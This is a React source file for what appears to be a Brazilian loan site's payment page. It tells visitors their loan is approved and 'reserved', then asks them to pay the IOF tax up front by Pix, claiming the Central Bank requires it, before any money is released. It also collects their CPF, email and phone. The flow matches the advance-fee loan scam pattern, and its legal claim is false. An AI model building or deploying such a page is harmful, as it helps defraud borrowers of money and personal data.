import React, { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Lock, AlertCircle, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { formatCurrency } from "@/utils/formatters";
import { addDays, format } from "date-fns";
import SecurityHeader from "@/components/SecurityHeader";
import SecurityFooter from "@/components/SecurityFooter";
import { Input } from "@/components/ui/input";

const IOFPayment = () => {
  const location = useLocation();
  const { loanValue, personalData, bankData, loanDetails, contactData } =
    location.state || {};

  const [pixData, setPixData] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const navigate = useNavigate();

  console.log("DEBUG IOFPayment: contactData", contactData);

  // Calcular o valor total do empréstimo (principal + juros)
  const calculateTotalLoanValue = () => {
    if (loanDetails?.totalWithInterest) {
      return loanDetails.totalWithInterest;
    }

    // Fallback: calcular com valores padrão se loanDetails não estiver disponível
    const installments = 24;
    const rate = 0.0135; // 1.35% a.m.
    const monthlyPayment =
      (loanValue * (rate * Math.pow(1 + rate, installments))) /
      (Math.pow(1 + rate, installments) - 1);
    return monthlyPayment * installments;
  };

  const totalLoanValue = calculateTotalLoanValue();

  // IOF calculado como 0,38% do valor total do empréstimo
  const iofRate = 0.0038; // 0,38%
  const iofValue = totalLoanValue * iofRate;

  const primeiraParcela = format(addDays(new Date(), 60), "dd/MM/yyyy");

  const handlePixPayment = async () => {
    setLoading(true);
    setError("");
    setPixData(null);
    // Validar e-mail e telefone do contactData
    const email = contactData?.email || "";
    const phone = contactData?.phone?.replace(/\D/g, "") || "";
    console.log("DEBUG IOFPayment: email", email, "phone", phone);
    const emailRegex = /^[\w-.]+@[\w-]+\.[a-zA-Z]{2,}$/;
    if (!email) {
      setError("E-mail obrigatório. Corrija no formulário inicial.");
      setLoading(false);
      return;
    }
    if (!emailRegex.test(email)) {
      setError("E-mail inválido. Corrija no formulário inicial.");
      setLoading(false);
      return;
    }
    if (!phone) {
      setError("Telefone obrigatório. Corrija no formulário inicial.");
      setLoading(false);
      return;
    }
    if (!phone.match(/^\d{10,11}$/)) {
      setError(
        "Telefone inválido. Corrija no formulário inicial. Use o formato DDD+Número, ex: 11999999999"
      );
      setLoading(false);
      return;
    }
    try {
      const identifier = `${personalData?.cpf}-${Date.now()}`;
      const dueDate = format(addDays(new Date(), 2), "yyyy-MM-dd");
      const payload = {
        identifier,
        amount: Number(iofValue.toFixed(2)),
        client: {
          name: `${personalData?.firstName || ""} ${
            personalData?.lastName || ""
          }`.trim(),
          email,
          phone,
          document: personalData?.cpf?.replace(/\D/g, "") || "",
        },
        dueDate,
        callbackUrl: "https://seusite.com/api/pix/callback",
        products: [
          {
            id: "iof-001",
            name: "IOF",
            quantity: 1,
            price: Number(iofValue.toFixed(2)),
          },
        ],
      };
      const res = await fetch("/api/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data?.error || "Erro ao criar cobrança Pix");

      // Verificar se a resposta tem sucesso
      if (!data.success || !data.pix) {
        throw new Error("Resposta inválida da API PIX");
      }

      // Redirecionar para a página de detalhes do Pix
      navigate("/pagamento-pix", {
        state: {
          pix: {
            code: data.pix.code,
            base64: data.pix.base64,
            image: data.pix.image,
          },
          transactionId: data.transaction.id,
          iofValue,
          loanValue,
          totalLoanValue,
          client: {
            name: `${personalData?.firstName || ""} ${
              personalData?.lastName || ""
            }`.trim(),
            email,
            phone,
            cpf: personalData?.cpf,
          },
        },
      });
      return;
    } catch (err: any) {
      setError(err.message || "Erro ao gerar cobrança Pix. Tente novamente.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-light flex flex-col">
      <SecurityHeader />
      <div className="flex-1 flex items-center justify-center min-h-[60vh]">
        <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
          <div className="max-w-2xl mx-auto">
            <div className="bg-white rounded-2xl shadow-xl p-6 sm:p-8">
              {/* Cabeçalho de sucesso */}
              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-green-100 rounded-full mx-auto flex items-center justify-center mb-6">
                  <CheckCircle2 className="w-8 h-8 text-green-600" />
                </div>

                <h1 className="text-2xl sm:text-3xl font-bold text-green-dark mb-4">
                  Seu valor já está disponível para transferência!
                </h1>

                <p className="text-lg text-gray-700 leading-relaxed max-w-lg mx-auto">
                  O seu empréstimo foi aprovado e o valor já está reservado para
                  sua conta.
                </p>
              </div>

              {/* Seção principal do IOF */}
              <div className="space-y-8">
                {/* Explicação do IOF */}
                <div className="bg-blue-50 rounded-xl p-6">
                  <div className="flex items-start gap-4">
                    <AlertCircle className="w-6 h-6 text-blue-600 mt-1 flex-shrink-0" />
                    <div className="space-y-4">
                      <div>
                        <h3 className="text-xl font-semibold text-gray-800 mb-3">
                          Última etapa para liberação
                        </h3>
                        <p className="text-base text-gray-700 leading-relaxed mb-4">
                          No entanto, falta apenas uma última etapa: o pagamento
                          do Imposto sobre Operações Financeiras (IOF).
                        </p>
                      </div>

                      <div>
                        <p className="text-base text-gray-700 leading-relaxed">
                          Conforme exigência legal do Banco Central, é
                          necessário quitar esse imposto para que o valor seja
                          liberado 100% e transferido imediatamente para sua
                          conta.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Resumo do empréstimo */}
                <div className="bg-green-50 rounded-xl p-6">
                  <h3 className="text-xl font-semibold text-green-dark mb-6">
                    Resumo do seu empréstimo
                  </h3>
                  <div className="space-y-4">
                    <div className="flex justify-between items-center py-2">
                      <span className="text-base text-green-dark">
                        Valor aprovado:
                      </span>
                      <span className="text-base font-bold text-green-dark">
                        {formatCurrency(loanValue || 0)}
                      </span>
                    </div>
                    <div className="flex justify-between items-center py-2">
                      <span className="text-base text-green-dark">
                        Valor total (com juros):
                      </span>
                      <span className="text-base font-bold text-green-dark">
                        {formatCurrency(totalLoanValue)}
                      </span>
                    </div>
                    <div className="border-t border-green-200 pt-4">
                      <div className="flex justify-between items-center py-2">
                        <span className="text-base text-green-dark">
                          IOF (0,38% do total):
                        </span>
                        <span className="text-lg font-bold text-red-600">
                          {formatCurrency(iofValue)}
                        </span>
                      </div>
                      <p className="text-sm text-green-700 mt-3">
                        O IOF é um tributo obrigatório em operações de crédito
                        no Brasil.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Informação de tempo */}
                <div className="bg-green-100 rounded-lg p-4 text-center">
                  <p className="text-base text-green-700 font-medium">
                    Assim que o pagamento for confirmado, a transferência será
                    feita para sua conta em até 3 horas.
                  </p>
                  <p className="text-xs text-gray-500 text-center mt-1 font-medium">
                    Primeira parcela em {primeiraParcela}
                  </p>
                </div>
              </div>

              {/* Botão de pagamento */}
              <div className="mt-10 flex flex-col items-center space-y-4">
                {!pixData && (
                  <Button
                    className="bg-green-primary hover:bg-green-dark text-white px-8 py-4 text-lg font-semibold rounded-xl shadow-lg transition-all duration-300 transform hover:scale-105 w-full max-w-sm"
                    size="lg"
                    onClick={handlePixPayment}
                    disabled={loading}
                  >
                    {loading ? (
                      <span className="flex items-center">
                        <Lock className="w-5 h-5 mr-3 animate-spin" />
                        Gerando Pix...
                      </span>
                    ) : (
                      <>
                        <Lock className="w-5 h-5 mr-3" />
                        PAGAR IOF
                      </>
                    )}
                  </Button>
                )}
                {error && (
                  <p className="text-red-500 text-sm text-center">{error}</p>
                )}
                {pixData && (
                  <div className="w-full max-w-xs mx-auto bg-green-50 rounded-xl p-4 flex flex-col items-center space-y-3 border border-green-200">
                    <p className="text-green-800 font-semibold text-center">
                      Escaneie o QR Code ou copie o código Pix para pagar o IOF:
                    </p>
                    {pixData.base64 ? (
                      <img
                        src={`data:image/png;base64,${pixData.base64}`}
                        alt="QR Code Pix"
                        className="w-48 h-48 mx-auto rounded-lg border"
                      />
                    ) : pixData.image ? (
                      <img
                        src={pixData.image}
                        alt="QR Code Pix"
                        className="w-48 h-48 mx-auto rounded-lg border"
                      />
                    ) : null}
                    <div className="bg-white rounded p-2 text-xs break-all border border-green-200 text-green-900 select-all">
                      {pixData.code}
                    </div>
                    <p className="text-green-700 text-xs text-center">
                      Após o pagamento, a liberação será automática.
                    </p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
      <SecurityFooter />
    </div>
  );
};

export default IOFPayment;
